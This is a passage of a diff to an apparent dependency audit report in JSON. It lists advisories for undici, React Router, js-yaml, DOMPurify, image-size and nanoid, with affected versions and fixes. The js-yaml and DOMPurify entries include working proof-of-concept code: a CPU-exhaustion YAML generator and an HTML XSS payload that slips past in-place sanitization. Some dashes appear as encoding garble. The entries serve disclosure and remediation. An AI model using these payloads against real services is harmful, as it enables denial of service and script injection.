+      "overview": "### Impact\n\nWhen an application passes a duck-typed blob-like body to undici's HTTP/1.1 dispatcher (via `request()`, `stream()`, `pipeline()`, or `dispatch()`) with a `.type` derived from untrusted input, an attacker can inject CRLF sequences (`\\r\\n`) to append arbitrary HTTP headers and potentially smuggle a second request past the upstream.\n\nThe vulnerable branch in `lib/dispatcher/client-h1.js` pushes `body.type` directly into the outgoing headers with no validation, while every other header path in undici goes through `isValidHeaderValue()`:\n\n```javascript\n} else if (util.isBlobLike(body) && request.contentType == null && body.type) {\n  headers.push('content-type', body.type)  // bypasses isValidHeaderValue()\n}\n```\n\nThe bug requires a hand-rolled duck-typed blob object or a Blob subclass with a controlled `.type`. Native `Blob` is safe because its constructor strips CRLF from `.type`. `fetch()` is unaffected because it validates via the `Headers` class. Ecosystem consumers that build duck-typed blob shapes from user input include `form-data-encoder`, `formdata-polyfill`, and `formdata-node`.\n\nSame defect class as `CVE-2022-35948` (explicit `content-type` sink, fixed in undici 5.8.2) and `CVE-2026-1527` (`upgrade` option sink, fixed in 6.24.0 / 7.24.0), both closed by adding `isValidHeaderValue()` on their respective sinks. This branch was missed.\n\n### Patches\n\nPatched in undici v6.28.0, v7.29.0, and v8.9.0. Users should upgrade to one of these versions or later.\n\n### Workarounds\n\n- Set an explicit, validated `content-type` header on the request options (skips the vulnerable branch).\n- Use a native `Blob` (or `fetch-blob`) instead of a hand-rolled duck-typed object.\n- Reject control characters in the MIME type before assigning it to `.type`.\n- Use `fetch()` instead of the non-`fetch` APIs.",
+      "reported_by": null,
+      "title": "undici vulnerable to CRLF Injection via blob-like body 'type' property",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-15157"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "undici",
+      "vulnerable_versions": "<6.28.0",
+      "github_advisory_id": "GHSA-m8rv-5g2x-5cg5",
+      "recommendation": "Upgrade to version 6.28.0 or later",
+      "patched_versions": ">=6.28.0",
+      "updated": "2026-08-03T19:33:56.000Z",
+      "cvss": {
+        "score": 4.2,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-93"
+      ],
+      "url": "https://github.com/advisories/GHSA-m8rv-5g2x-5cg5"
+    },
+    "1130732": {
+      "findings": [
+        {
+          "version": "6.27.0",
+          "paths": [
+            "apps__installer>electron-builder>app-builder-lib>@electron/rebuild>node-gyp>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-v3r7-h72x-cjcm\n- https://nvd.nist.gov/vuln/detail/CVE-2026-16729\n- https://github.com/nodejs/undici/commit/10d93fc332f2c8c161982dec3833201de29891b5\n- https://github.com/nodejs/undici/commit/3bf91ddb493e853957f3a58e155326a668ab8aef\n- https://github.com/nodejs/undici/commit/af7484043ee075a6f216da0ad77e1dac55199235\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v6.28.0\n- https://github.com/nodejs/undici/releases/tag/v7.29.0\n- https://github.com/nodejs/undici/releases/tag/v8.9.0\n- https://github.com/advisories/GHSA-v3r7-h72x-cjcm",
+      "created": "2026-08-03T19:30:52.000Z",
+      "id": 1130732,
+      "npm_advisory_id": null,
+      "overview": "## Impact\n\nThe `setCookie` function has two attribute injection paths. `validateCookieDomain` does not reject semicolons (`validateCookiePath` already does at 0x3B), so a `domain` value like `example.com; SameSite=None` lands verbatim as `Domain=example.com; SameSite=None`. The `unparsed` array's loop only checks each entry contains `=` and does not sanitize values, so an entry like `X-Custom=val; HttpOnly` lands unchanged, injecting `HttpOnly` without the caller setting `cookie.httpOnly = true`.\n\nApplications that pass user-controlled input to these fields, typically multi-tenant or reverse-proxy servers that scope session cookies to a tenant-supplied domain, can have SameSite CSRF protections bypassed, `Secure` or `HttpOnly` forced or stripped, or the intended SameSite tier overridden.\n\n## Patches\n\nPatched in undici v6.28.0, v7.29.0, and v8.9.0.\n\n## Workarounds\n\n- Sanitize `domain` values against the RFC 1034 letter-digit-hyphen set before passing to `setCookie`.\n- Do not pass user-controlled data to the `unparsed` field.",
+      "reported_by": null,
+      "title": "undici vulnerable to cookie attribute injection via unsanitized domain and unparsed setCookie fields",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-16729"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "undici",
+      "vulnerable_versions": "<6.28.0",
+      "github_advisory_id": "GHSA-v3r7-h72x-cjcm",
+      "recommendation": "Upgrade to version 6.28.0 or later",
+      "patched_versions": ">=6.28.0",
+      "updated": "2026-08-03T19:30:53.000Z",
+      "cvss": {
+        "score": 4.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-74"
+      ],
+      "url": "https://github.com/advisories/GHSA-v3r7-h72x-cjcm"
+    },
+    "1136293": {
+      "findings": [
+        {
+          "version": "1.23.2",
+          "paths": [
+            "apps__management>react-router-dom>@remix-run/router"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/remix-run/react-router/security/advisories/GHSA-2j2x-hqr9-3h42\n- https://nvd.nist.gov/vuln/detail/CVE-2026-40181\n- https://github.com/remix-run/react-router/commit/d77f6b1\n- https://github.com/advisories/GHSA-2j2x-hqr9-3h42",
+      "created": "2026-06-03T20:58:01.000Z",
+      "id": 1136293,
+      "npm_advisory_id": null,
+      "overview": "Certain URLs passed to the `redirect` function can trigger an open redirect to an external domain depending on the level of validation done by the application prior to returning the `redirect`.\n\n> [!NOTE]\n> This does not impact your React Router application if you are using [Declarative Mode](https://reactrouter.com/start/modes#declarative) (`<BrowserRouter>`)",
+      "reported_by": null,
+      "title": "React Router's same-origin redirect with path starting // causes open redirect via protocol-relative URL reinterpretation",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-40181"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@remix-run/router",
+      "vulnerable_versions": ">=1.3.0 <1.23.3",
+      "github_advisory_id": "GHSA-2j2x-hqr9-3h42",
+      "recommendation": "Upgrade to version 1.23.3 or later",
+      "patched_versions": ">=1.23.3",
+      "updated": "2026-08-04T21:26:11.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-601"
+      ],
+      "url": "https://github.com/advisories/GHSA-2j2x-hqr9-3h42"
+    },
+    "1136303": {
+      "findings": [
+        {
+          "version": "6.30.3",
+          "paths": [
+            "apps__management>react-router-dom>react-router"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/remix-run/react-router/security/advisories/GHSA-2j2x-hqr9-3h42\n- https://nvd.nist.gov/vuln/detail/CVE-2026-40181\n- https://github.com/remix-run/react-router/commit/d77f6b1\n- https://github.com/advisories/GHSA-2j2x-hqr9-3h42",
+      "created": "2026-06-03T20:58:01.000Z",
+      "id": 1136303,
+      "npm_advisory_id": null,
+      "overview": "Certain URLs passed to the `redirect` function can trigger an open redirect to an external domain depending on the level of validation done by the application prior to returning the `redirect`.\n\n> [!NOTE]\n> This does not impact your React Router application if you are using [Declarative Mode](https://reactrouter.com/start/modes#declarative) (`<BrowserRouter>`)",
+      "reported_by": null,
+      "title": "React Router's same-origin redirect with path starting // causes open redirect via protocol-relative URL reinterpretation",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-40181"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "react-router",
+      "vulnerable_versions": ">=6.7.0 <6.30.4",
+      "github_advisory_id": "GHSA-2j2x-hqr9-3h42",
+      "recommendation": "Upgrade to version 6.30.4 or later",
+      "patched_versions": ">=6.30.4",
+      "updated": "2026-08-04T21:26:11.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-601"
+      ],
+      "url": "https://github.com/advisories/GHSA-2j2x-hqr9-3h42"
+    },
+    "1138114": {
+      "findings": [
+        {
+          "version": "3.15.0",
+          "paths": [
+            "apps__docs>@docusaurus/core>@docusaurus/utils>gray-matter>js-yaml"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodeca/js-yaml/security/advisories/GHSA-5p4m-2wfm-xmqj\n- https://github.com/advisories/GHSA-5p4m-2wfm-xmqj",
+      "created": "2026-08-06T20:27:32.000Z",
+      "id": 1138114,
+      "npm_advisory_id": null,
+      "overview": "# Quadratic CPU consumption in `!!omap` resolution (js-yaml 3.x and 4.x)\n\n## Summary\n\n`resolveYamlOmap()` enforces key uniqueness for `!!omap` sequences with a linear\nscan (`objectKeys.indexOf(...)`) inside the per-element loop, making resolution\n**O(n┬▓)** in the number of entries. A modestly sized YAML document therefore\nconsumes disproportionate CPU inside `yaml.load()`, giving a denial of service\nagainst any consumer that parses untrusted YAML.\n\n`!!omap` is registered in the **default schema**\n(`lib/schema/default.js` ΓåÆ `require('../type/omap')`), so a plain\n`yaml.load(untrustedInput)` with no options is affected ΓÇö no custom schema or\nnon-default configuration is required.\n\n**This is the same weakness as CVE-2026-59870 / GHSA-724g-mxrg-4qvm**, which was\nfixed in the 5.x line in 5.2.1. That fix was never backported: both currently\nmaintained legacy lines still carry the original implementation.\n\n## Affected versions\n\n| Line | Latest tested | Status |\n|---|---|---|\n| 3.x | **3.15.0** | Affected ΓÇö `objectKeys.indexOf(pairKey)` at `lib/type/omap.js:29` |\n| 4.x | **4.3.0** | Affected ΓÇö `objectKeys.indexOf(pairKey)` at `lib/type/omap.js:30` |\n| 5.x | 5.2.2 | **Not affected** ΓÇö fixed in 5.2.1 (uses a `Set`) |\n\nBoth figures are the newest release of each line at the time of writing, so\nthis is not a \"you are on an old version\" issue.\n\n## Details\n\n`lib/type/omap.js` (js-yaml 4.3.0):\n\n```js\nif (objectKeys.indexOf(pairKey) === -1) objectKeys.push(pairKey)\nelse return false\n```\n\n`objectKeys` grows by one element per entry, and `Array.prototype.indexOf` is a\nlinear scan, so resolving an `n`-entry `!!omap` performs roughly\n`1 + 2 + ΓÇª + n` comparisons ΓÇö quadratic in `n`. The work happens synchronously\ninside `yaml.load()`, blocking the event loop for its whole duration.\n\nThe 5.x line already solves exactly this by tracking seen keys in a `Set`\n(`src/tag/sequence/omap.ts`):\n\n```ts\nif (carrier.seen.has(key)) return 'duplicate key in ordered map'\ncarrier.seen.add(key)\n```\n\n## Proof of concept\n\n```js\n// poc.js  ΓÇö  node poc.js\nconst yaml = require('js-yaml');\nconst doc = n => '!!omap\\n' + Array.from({length: n}, (_, i) => `- k${i}: ${i}`).join('\\n') + '\\n';\n\nfor (const n of [10000, 20000, 40000, 80000]) {\n  const d = doc(n), t = Date.now();\n  yaml.load(d);                      // default schema, no options\n  console.log(`n=${n} bytes=${d.length} load=${Date.now() - t}ms`);\n}\n```\n\n### Measured (node v20.20.2, default heap, no flags)\n\n**js-yaml 4.3.0**\n\n```\nn=10000  bytes=137787   load=54ms\nn=20000  bytes=297787   load=169ms\nn=40000  bytes=617787   load=646ms\nn=80000  bytes=1257787  load=2607ms\n```\n\n**js-yaml 3.15.0**\n\n```\nn=10000  bytes=137787   load=53ms\nn=20000  bytes=297787   load=166ms\nn=40000  bytes=617787   load=641ms\nn=80000  bytes=1257787  load=2567ms\n```\n\nRuntime grows by a factor of ~4 for each doubling of `n`, which is the\nsignature of O(n┬▓) (linear growth would be ~2├ù).\n\nScaling further: a **2.48 MB** document with 150,000 entries blocked\n`yaml.load()` for **10.8 seconds**.\n\n## Impact\n\nAny service that parses attacker-influenced YAML with js-yaml 3.x or 4.x can be\nstalled with a small input. Because the loop is synchronous, a single request\nblocks the Node.js event loop and stalls every other request in the process ΓÇö\nso the amplification is per-process, not just per-request.\n\nSuggested severity: consistent with **CVE-2026-59870** (the same weakness in\n5.x), i.e. Availability-only impact, network attack vector, no privileges or\nuser interaction required.\n\n## Suggested fix\n\nMirror the 5.x fix ΓÇö replace the linear scan with a `Set`:\n\n```js\n// lib/type/omap.js\nconst seen = new Set()\n// ...\nif (seen.has(pairKey)) return false\nseen.add(pairKey)\n```\n\nThis preserves the existing duplicate-key rejection semantics exactly while\nmaking resolution O(n). A `maxOmapLength`-style cap would also work, but the\n`Set` matches what 5.x already ships and requires no new option.\n\n## References\n\n- CVE-2026-59870 / GHSA-724g-mxrg-4qvm ΓÇö same weakness in 5.0.0ΓÇô5.2.0, fixed in 5.2.1\n- `lib/type/omap.js` (3.x, 4.x) ΓÇö the affected resolver\n- `lib/schema/default.js` ΓÇö registers `!!omap` in the default schema\n\n## Discovery\n\nFound by an automated static-analysis and executed-proof-of-concept scanner run\nagainst js-yaml 4.2.0, then manually verified against 3.15.0 and 4.3.0 by\nexecuting the proof of concept above. All timings in this report were measured\non the **current** releases of each line, not on the version originally scanned.",
+      "reported_by": null,
+      "title": "JS-YAML: Quadratic CPU consumption in !!omap resolution (3.x and 4.x) ΓÇö CVE-2026-59870 fix not backported",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "js-yaml",
+      "vulnerable_versions": ">=3.0.0 <3.15.1",
+      "github_advisory_id": "GHSA-5p4m-2wfm-xmqj",
+      "recommendation": "Upgrade to version 3.15.1 or later",
+      "patched_versions": ">=3.15.1",
+      "updated": "2026-08-06T20:27:32.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-5p4m-2wfm-xmqj"
+    },
+    "1138115": {
+      "findings": [
+        {
+          "version": "4.3.0",
+          "paths": [
+            "apps__cloud-backend>drizzle-orm>expo-sqlite>expo>@expo/cli>@expo/xcpretty>js-yaml"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodeca/js-yaml/security/advisories/GHSA-5p4m-2wfm-xmqj\n- https://github.com/advisories/GHSA-5p4m-2wfm-xmqj",
+      "created": "2026-08-06T20:27:32.000Z",
+      "id": 1138115,
+      "npm_advisory_id": null,
+      "overview": "# Quadratic CPU consumption in `!!omap` resolution (js-yaml 3.x and 4.x)\n\n## Summary\n\n`resolveYamlOmap()` enforces key uniqueness for `!!omap` sequences with a linear\nscan (`objectKeys.indexOf(...)`) inside the per-element loop, making resolution\n**O(n┬▓)** in the number of entries. A modestly sized YAML document therefore\nconsumes disproportionate CPU inside `yaml.load()`, giving a denial of service\nagainst any consumer that parses untrusted YAML.\n\n`!!omap` is registered in the **default schema**\n(`lib/schema/default.js` ΓåÆ `require('../type/omap')`), so a plain\n`yaml.load(untrustedInput)` with no options is affected ΓÇö no custom schema or\nnon-default configuration is required.\n\n**This is the same weakness as CVE-2026-59870 / GHSA-724g-mxrg-4qvm**, which was\nfixed in the 5.x line in 5.2.1. That fix was never backported: both currently\nmaintained legacy lines still carry the original implementation.\n\n## Affected versions\n\n| Line | Latest tested | Status |\n|---|---|---|\n| 3.x | **3.15.0** | Affected ΓÇö `objectKeys.indexOf(pairKey)` at `lib/type/omap.js:29` |\n| 4.x | **4.3.0** | Affected ΓÇö `objectKeys.indexOf(pairKey)` at `lib/type/omap.js:30` |\n| 5.x | 5.2.2 | **Not affected** ΓÇö fixed in 5.2.1 (uses a `Set`) |\n\nBoth figures are the newest release of each line at the time of writing, so\nthis is not a \"you are on an old version\" issue.\n\n## Details\n\n`lib/type/omap.js` (js-yaml 4.3.0):\n\n```js\nif (objectKeys.indexOf(pairKey) === -1) objectKeys.push(pairKey)\nelse return false\n```\n\n`objectKeys` grows by one element per entry, and `Array.prototype.indexOf` is a\nlinear scan, so resolving an `n`-entry `!!omap` performs roughly\n`1 + 2 + ΓÇª + n` comparisons ΓÇö quadratic in `n`. The work happens synchronously\ninside `yaml.load()`, blocking the event loop for its whole duration.\n\nThe 5.x line already solves exactly this by tracking seen keys in a `Set`\n(`src/tag/sequence/omap.ts`):\n\n```ts\nif (carrier.seen.has(key)) return 'duplicate key in ordered map'\ncarrier.seen.add(key)\n```\n\n## Proof of concept\n\n```js\n// poc.js  ΓÇö  node poc.js\nconst yaml = require('js-yaml');\nconst doc = n => '!!omap\\n' + Array.from({length: n}, (_, i) => `- k${i}: ${i}`).join('\\n') + '\\n';\n\nfor (const n of [10000, 20000, 40000, 80000]) {\n  const d = doc(n), t = Date.now();\n  yaml.load(d);                      // default schema, no options\n  console.log(`n=${n} bytes=${d.length} load=${Date.now() - t}ms`);\n}\n```\n\n### Measured (node v20.20.2, default heap, no flags)\n\n**js-yaml 4.3.0**\n\n```\nn=10000  bytes=137787   load=54ms\nn=20000  bytes=297787   load=169ms\nn=40000  bytes=617787   load=646ms\nn=80000  bytes=1257787  load=2607ms\n```\n\n**js-yaml 3.15.0**\n\n```\nn=10000  bytes=137787   load=53ms\nn=20000  bytes=297787   load=166ms\nn=40000  bytes=617787   load=641ms\nn=80000  bytes=1257787  load=2567ms\n```\n\nRuntime grows by a factor of ~4 for each doubling of `n`, which is the\nsignature of O(n┬▓) (linear growth would be ~2├ù).\n\nScaling further: a **2.48 MB** document with 150,000 entries blocked\n`yaml.load()` for **10.8 seconds**.\n\n## Impact\n\nAny service that parses attacker-influenced YAML with js-yaml 3.x or 4.x can be\nstalled with a small input. Because the loop is synchronous, a single request\nblocks the Node.js event loop and stalls every other request in the process ΓÇö\nso the amplification is per-process, not just per-request.\n\nSuggested severity: consistent with **CVE-2026-59870** (the same weakness in\n5.x), i.e. Availability-only impact, network attack vector, no privileges or\nuser interaction required.\n\n## Suggested fix\n\nMirror the 5.x fix ΓÇö replace the linear scan with a `Set`:\n\n```js\n// lib/type/omap.js\nconst seen = new Set()\n// ...\nif (seen.has(pairKey)) return false\nseen.add(pairKey)\n```\n\nThis preserves the existing duplicate-key rejection semantics exactly while\nmaking resolution O(n). A `maxOmapLength`-style cap would also work, but the\n`Set` matches what 5.x already ships and requires no new option.\n\n## References\n\n- CVE-2026-59870 / GHSA-724g-mxrg-4qvm ΓÇö same weakness in 5.0.0ΓÇô5.2.0, fixed in 5.2.1\n- `lib/type/omap.js` (3.x, 4.x) ΓÇö the affected resolver\n- `lib/schema/default.js` ΓÇö registers `!!omap` in the default schema\n\n## Discovery\n\nFound by an automated static-analysis and executed-proof-of-concept scanner run\nagainst js-yaml 4.2.0, then manually verified against 3.15.0 and 4.3.0 by\nexecuting the proof of concept above. All timings in this report were measured\non the **current** releases of each line, not on the version originally scanned.",
+      "reported_by": null,
+      "title": "JS-YAML: Quadratic CPU consumption in !!omap resolution (3.x and 4.x) ΓÇö CVE-2026-59870 fix not backported",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "js-yaml",
+      "vulnerable_versions": ">=4.0.0 <4.3.1",
+      "github_advisory_id": "GHSA-5p4m-2wfm-xmqj",
+      "recommendation": "Upgrade to version 4.3.1 or later",
+      "patched_versions": ">=4.3.1",
+      "updated": "2026-08-06T20:27:32.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-5p4m-2wfm-xmqj"
+    },
+    "1138538": {
+      "findings": [
+        {
+          "version": "3.4.11",
+          "paths": [
+            "apps__website>dompurify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-55q2-fjhq-7xh7\n- https://github.com/cure53/DOMPurify/pull/1557\n- https://github.com/cure53/DOMPurify/commit/3067f7746769\n- https://github.com/cure53/DOMPurify/releases/tag/3.4.13\n- https://github.com/advisories/GHSA-55q2-fjhq-7xh7",
+      "created": "2026-08-07T15:30:47.000Z",
+      "id": 1138538,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nDuring `IN_PLACE` sanitization, a hook that removes an element can leave that element's detached descendants executable. A descendant image can retain its attacker-provided `onload` handler and fire after `sanitize()` returns, even though the returned root is clean and the image remains disconnected from the document.\n\n### Details\n\nIn DOMPurify 3.4.12, `_sanitizeElements()` in `src/purify.ts:1862-1904` runs the `beforeSanitizeElements` or `uponSanitizeElement` hook and returns immediately when the hook detached the current node. The return does not call `_neutralizeSubtree(currentNode)`.\n\nThe detached subtree is not added to `DOMPurify.removed`, so the post-walk `IN_PLACE` neutralization cannot reach it. If the browser queued a resource event while the application constructed the detached dirty root, a descendant can therefore retain its handler and execute after sanitization.\n\nThe hook only rejects the containing element and does not add or approve the event handler. DOMPurify's ordinary removal path de-arms the same queued event; only the hook-detachment early return skips the existing subtree neutralization.\n\n### PoC\n\nLoad the published `dompurify@3.4.12` `dist/purify.js` before this script in Chromium:\n\n```html\n<div id=\"result\">not fired</div>\n<script>\nconst root = document.createElement('div');\nroot.innerHTML = `\n  <footer>\n    <img src=\"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\"\n         onload=\"result.textContent = 'XSS after sanitize'\">\n  </footer>\n  <div>safe</div>`;\n\nDOMPurify.setConfig({\n  ALLOWED_TAGS: ['div', '#text', 'footer'],\n  IN_PLACE: true\n});\nDOMPurify.addHook('uponSanitizeElement', node => {\n  if (node.tagName === 'FOOTER') node.remove();\n});\n\nDOMPurify.sanitize(root);\ndocument.body.append(root);\n</script>\n```\n\n`sanitize()` returns with no handler execution and the returned root contains only the safe `div`. After the event loop advances, the original image remains disconnected but its retained `onload` changes the page to `XSS after sanitize`.\n\nAs the claim-matched control, use the same detached input with `ALLOWED_TAGS: ['div', '#text']` and no hook. DOMPurify's ordinary removal path removes the original image's handler, the returned root is still `<div>safe</div>`, and the marker does not fire.\n\n### Impact\n\nIn an application that uses `IN_PLACE` with the documented element-removal hook pattern, an attacker who can supply HTML can execute JavaScript in the integrating application's origin after the application sanitizes and renders that content.\n\nThe required non-default configuration is `IN_PLACE` plus a hook that removes a containing element. The hook does not add or approve the event handler, and the dirty root never needs to be connected before sanitization.\n\n### Suggested fix\n\nReuse the existing `_neutralizeSubtree(currentNode)` helper before returning from both hook-detachment branches in `_sanitizeElements()`. Add regressions for `beforeSanitizeElements` and `uponSanitizeElement` that retain a reference to a descendant resource element and verify that its event handler is removed after the hook detaches its ancestor.",
+      "reported_by": null,
+      "title": "DOMPurify: IN_PLACE hook removal leaves a detached subtree executable, causing XSS",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "dompurify",
+      "vulnerable_versions": "<=3.4.12",
+      "github_advisory_id": "GHSA-55q2-fjhq-7xh7",
+      "recommendation": "Upgrade to version 3.4.13 or later",
+      "patched_versions": ">=3.4.13",
+      "updated": "2026-08-07T15:30:48.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-55q2-fjhq-7xh7"
+    },
+    "1138808": {
+      "findings": [
+        {
+          "version": "1.2.1",
+          "paths": [
+            "apps__cloud-backend>drizzle-orm>expo-sqlite>expo>@expo/cli>expo-router>@expo/ui>react-native-worklets>@react-native/metro-config>metro-config>metro>image-size"
+          ]
+        },
+        {
+          "version": "2.0.2",
+          "paths": [
+            "apps__docs>@docusaurus/core>@docusaurus/mdx-loader>image-size"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-71330\n- https://joshua.hu/image-size-infinite-loop-dos-vulnerabilities\n- https://web.archive.org/web/20260224152152/https://github.com/image-size/image-size/pull/439\n- https://www.vulncheck.com/advisories/image-size-denial-of-service-via-malformed-icns-image-parsing\n- https://github.com/advisories/GHSA-w3rx-r6r6-pgpr",
+      "created": "2026-06-10T15:31:30.000Z",
+      "id": 1138808,
+      "npm_advisory_id": null,
+      "overview": "image-size through 2.0.2 contains a denial of service vulnerability that allows remote attackers to permanently block the Node.js event loop by supplying a specially crafted ICNS image buffer. Attackers can craft an ICNS buffer containing valid magic bytes and a zero-valued entry length field to trigger an infinite loop in the ICNS parser, as the offset is never incremented when the entry length field is 0, causing the while loop condition to remain true indefinitely.",
+      "reported_by": null,
+      "title": "image-size: ICNS parser allows denial of service through an infinite loop",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-71330"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "image-size",
+      "vulnerable_versions": "<=2.0.2",
+      "github_advisory_id": "GHSA-w3rx-r6r6-pgpr",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2026-08-07T20:55:24.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-w3rx-r6r6-pgpr"
+    },
+    "1138809": {
+      "findings": [
+        {
+          "version": "1.2.1",
+          "paths": [
+            "apps__cloud-backend>drizzle-orm>expo-sqlite>expo>@expo/cli>expo-router>@expo/ui>react-native-worklets>@react-native/metro-config>metro-config>metro>image-size"
+          ]
+        },
+        {
+          "version": "2.0.2",
+          "paths": [
+            "apps__docs>@docusaurus/core>@docusaurus/mdx-loader>image-size"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-71329\n- https://joshua.hu/image-size-infinite-loop-dos-vulnerabilities\n- https://web.archive.org/web/20260224152152/https://github.com/image-size/image-size/pull/439\n- https://www.vulncheck.com/advisories/image-size-denial-of-service-via-infinite-loop-in-jxl-heif-parser\n- https://github.com/advisories/GHSA-5p2g-fcmc-qvqq",
+      "created": "2026-06-10T15:31:30.000Z",
+      "id": 1138809,
+      "npm_advisory_id": null,
+      "overview": "image-size through 2.0.2 contains a denial of service vulnerability that allows remote attackers to permanently block the Node.js event loop by supplying a specially crafted image buffer with a zero-valued size field in a recognized box-type. Attackers can trigger an infinite loop in the JXL or HEIF image parsers by providing a crafted image containing a box with a size of zero, causing the offset to never advance and permanently hanging the application.",
+      "reported_by": null,
+      "title": "image-size: JXL and HEIF parsers allow denial of service through infinite loops",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-71329"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "image-size",
+      "vulnerable_versions": "<=2.0.2",
+      "github_advisory_id": "GHSA-5p2g-fcmc-qvqq",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2026-08-07T20:54:42.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-5p2g-fcmc-qvqq"
+    },
+    "1138811": {
+      "findings": [
+        {
+          "version": "3.3.15",
+          "paths": [
+            "apps__cloud-backend>drizzle-orm>expo-sqlite>expo>@expo/cli>expo-router>nanoid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-67214\n- https://github.com/ai/nanoid/commit/6ccc67bbaba71d3d77a21d9b636f4171a268ce49\n- https://github.com/ai/nanoid/releases/tag/5.1.16\n- https://www.vulncheck.com/advisories/nanoid-before-infinite-loop-via-negative-size-in-non-secure-module\n- https://github.com/ai/nanoid/pull/600\n- https://github.com/ai/nanoid/pull/601\n- https://github.com/ai/nanoid/commit/e835c9b71eab832bc6106944bdd26ea96cf2c66d\n- https://github.com/advisories/GHSA-28wg-ghj8-5hjv",
+      "created": "2026-07-29T15:31:12.000Z",
+      "id": 1138811,
+      "npm_advisory_id": null,
+      "overview": "nanoid (Nano ID) before 5.1.16 contains an infinite loop in the customAlphabet and nanoid functions of its non-secure module (nanoid/non-secure). When these functions are given a negative size, the loop counter is decremented from a negative value and never reaches its termination condition, spinning indefinitely and hanging the calling thread. An application that passes an unvalidated, attacker-controlled negative size to these functions is exposed to a denial-of-service condition.",
+      "reported_by": null,
+      "title": "nanoid: non-secure generators can loop indefinitely with negative size",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-67214"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "nanoid",
+      "vulnerable_versions": "<3.3.16",
+      "github_advisory_id": "GHSA-28wg-ghj8-5hjv",
+      "recommendation": "Upgrade to version 3.3.16 or later",
+      "patched_versions": ">=3.3.16",
+      "updated": "2026-08-07T20:53:01.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-28wg-ghj8-5hjv"
+    },
+    "1138813": {
+      "findings": [
+        {
+          "version": "3.3.15",
+          "paths": [
+            "apps__cloud-backend>drizzle-orm>expo-sqlite>expo>@expo/cli>expo-router>nanoid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
